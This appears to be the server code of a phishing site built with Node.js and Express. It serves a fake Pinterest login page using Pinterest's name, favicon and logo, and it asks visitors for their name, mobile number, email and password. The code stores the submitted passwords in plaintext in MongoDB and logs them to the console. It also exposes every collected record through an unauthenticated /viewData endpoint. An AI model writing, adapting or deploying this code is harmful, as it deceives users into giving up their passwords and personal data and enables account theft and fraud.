require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path'); 
const cors = require('cors');
const mongoose = require('mongoose');
const app = express();
const port = process.env.PORT || 3000;
const dbUri = process.env.MONGO_URI;
// MongoDB connection (replace with your actual connection string)
mongoose.connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => console.log("Connected to MongoDB"))
.catch((err) => console.error("Failed to connect to MongoDB", err));

// Middleware to allow CORS
app.use(cors());

// Middleware to parse JSON request body
app.use(bodyParser.json());

// Serve static files from the 'frontend' folder
app.use(express.static(path.join(__dirname, '../frontend')));

// Serve the index.html file when visiting the root route
app.get('/', (req, res) => {
    const apiUrl = process.env.REACT_APP_API_URL || "http://localhost:3000";  // Default to localhost for local dev
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Welcome to Pinterest</title>
            <link rel="icon" href="https://www.pinterest.com/favicon.ico" type="image/x-icon">
            <link rel="stylesheet" href="styles.css">
            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
        </head>
        <body>
            <script>window.API_URL = "${apiUrl}";</script>  <!-- Add this line to inject the URL -->
            <div class="container">
                <div class="signup-box">
                    <img src="assets/pinterest-logo.png" alt="Pinterest Logo" class="logo">
                    <h1>Log in to see more</h1>
                    <p class="subtitle">Find new ideas to try</p>

                    <form id="signupForm">
                        <div class="input-group">
                            <input type="text" id="firstName" placeholder="First Name" required>
                        </div>
                        <div class="input-group">
                            <input type="text" id="lastName" placeholder="Last Name" required>
                        </div>
                        <div class="input-group">
                            <input type="tel" id="mobileNumber" placeholder="Mobile Number" required pattern="^\d{10}$" title="Please enter a valid 10-digit mobile number">
                        </div>
                        <div class="input-group">
                            <input type="email" id="email" placeholder="Mail" required>
                        </div>
                        <div class="input-group">
                            <input type="password" id="password" placeholder="Create a password" required>
                        </div>
                        <button type="submit" class="btn btn-pinterest">Continue to view the image</button>
                    </form>
                </div>
            </div>
            <script src="index.js"></script>  <!-- Make sure to link your JS file -->
        </body>
        </html>
    `);
});

// MongoDB schema and model
const userSchema = new mongoose.Schema({
    firstName: String,
    lastName: String,
    mobileNumber: String,
    email: String,
    password: String,
});
const User = mongoose.model('User', userSchema);

// Endpoint to handle storing the user data
app.post('/storeData', (req, res) => {
    const userData = req.body;
    console.log('Received data:', userData);  // Log incoming data

    const phoneRegex = /^\d{10}$/;
    if (!phoneRegex.test(userData.mobileNumber)) {
        return res.status(400).json({ error: 'Invalid mobile number. Must be 10 digits.' });
    }

    const newUser = new User(userData);

    newUser.save()
        .then(() => {
            console.log('User saved:', userData);  // Log the saved data
            res.status(200).json({ message: 'Data stored successfully' });
        })
        .catch((err) => {
            console.error('Error saving data:', err);  // Log error if any
            res.status(500).json({ error: 'Failed to store data', err });
        });
});

// Endpoint to view all stored data (admin page)
app.get('/viewData', (req, res) => {
    User.find()
        .then(users => res.json(users))
        .catch(err => res.status(500).json({ error: 'Failed to fetch data', err }));
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at ${process.env.REACT_APP_API_URL || 'http://localhost:3000'}`);
});
